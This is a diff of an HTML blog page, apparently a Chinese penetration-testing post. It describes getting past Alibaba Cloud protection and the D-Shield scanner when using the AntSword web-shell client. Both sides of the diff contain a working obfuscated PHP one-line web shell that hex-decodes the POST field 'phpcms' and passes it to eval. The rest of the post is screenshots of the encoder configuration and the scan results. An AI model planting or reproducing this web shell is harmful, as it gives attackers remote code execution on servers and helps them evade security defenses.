@@ -85,8 +85,8 @@
             <div class="post-content py-5 z-depth-3 main">
                 <p>​                  </p>
 <p>渗透遇到阿里云的主机，蚁剑连接php一句话的时候如果用默认的几种编码的话都会被拦，所以想改下编码和一句话，同时过d盾和阿里云。<br>这里没用base64解码，我用hex解码的方式。</p>
-<h4 id="PHP一句话"><a href="#PHP一句话" class="headerlink" title="PHP一句话"></a>PHP一句话</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phpclass _&#123;    static public $phpcms=Null;    function __construct($l=&quot;error&quot;)&#123;        self::$phpcms=$l;        @eval/*Defining error level offences*/(null.null.self::$phpcms);    &#125;&#125;function hexToStr($hex)&#123;           $str=&quot;&quot;;         for($i=0;$i&lt;strlen($hex)-1;$i+=2)        $str.=chr(hexdec($hex[$i].$hex[$i+1]));        return  $str;    &#125; $error = null.hexToStr(@$_POST/*\*/[&quot;phpcms&quot;]);$d = new _($error);?&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="https://90sec.me/photo/201904/1554392704296.jpg" alt="1554392704296.jpg"></p>
+<h4 id="PHP一句话"><a href="#PHP一句话" class="headerlink" title="PHP一句话"></a>PHP一句话</h4><pre><code>&lt;?phpclass _{    static public $phpcms=Null;    function __construct($l=&quot;error&quot;){        self::$phpcms=$l;        @eval/*Defining error level offences*/(null.null.self::$phpcms);    }}function hexToStr($hex){           $str=&quot;&quot;;         for($i=0;$i&lt;strlen($hex)-1;$i+=2)        $str.=chr(hexdec($hex[$i].$hex[$i+1]));        return  $str;    } $error = null.hexToStr(@$_POST/*\*/[&quot;phpcms&quot;]);$d = new _($error);?&gt;
+</code></pre><p><img src="https://90sec.me/photo/201904/1554392704296.jpg" alt="1554392704296.jpg"></p>
 <h4 id="蚁剑添加编码"><a href="#蚁剑添加编码" class="headerlink" title="蚁剑添加编码"></a>蚁剑添加编码</h4><p><img src="https://90sec.me/photo/201904/1554443681851.jpg" alt="1554443681851.jpg"></p>
 <h4 id="D盾扫描结果"><a href="#D盾扫描结果" class="headerlink" title="D盾扫描结果"></a>D盾扫描结果</h4><p><img src="https://90sec.me/photo/201904/1554393266240.jpg" alt="1554393266240.jpg"></p>
 
